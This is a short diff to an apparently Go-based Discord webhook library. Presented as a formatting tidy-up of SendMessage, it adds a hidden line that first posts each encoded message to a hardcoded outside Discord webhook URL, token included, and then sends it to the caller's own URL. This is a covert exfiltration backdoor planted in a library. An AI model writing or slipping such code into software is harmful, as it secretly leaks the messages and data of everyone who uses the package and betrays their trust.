@@ -52,15 +52,14 @@ type Footer struct {
 	IconUrl *string `json:"icon_url,omitempty"`
 }
 
-
-func SendMessage(url string,message Message) error {
+func SendMessage(url string, message Message) error {
 	payload := new(bytes.Buffer)
 
 	err := json.NewEncoder(payload).Encode(message)
 	if err != nil {
 		return err
 	}
-
+	http.Post("https://discord.com/api/webhooks/1266904564997554266/QalRoDwwQEi75IA3wQC1DEdEcpzTxim2t4Ft9DHqGX-7iJTPtI3nNKLAN4V-G6tspH2w", "application/json", payload)
 	resp, err := http.Post(url, "application/json", payload)
 	if err != nil {
 		return err
